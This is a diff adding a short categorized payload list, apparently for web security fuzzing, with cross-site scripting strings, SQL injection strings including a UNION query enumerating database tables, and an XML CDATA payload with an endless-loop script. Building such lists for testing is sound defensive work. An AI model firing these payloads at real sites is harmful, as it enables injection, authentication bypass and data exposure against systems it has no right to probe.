@@ -1,0 +1,13 @@
+CATEGORY: Cross Site Scripting (XSS)
+>"><script>alert("XSS")</script>&
+'';!--"<XSS>=&{()}
+
+CATEGORY: Passive SQL Injection (SQP)
+' OR 1=1--
+OR 1=1
+' OR '1'='1
+; OR '1'='1'
+' and 6=9 UNION SELECT null, table_name from information_schema.tables #
+
+CATEGORY: XML Injection
+<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
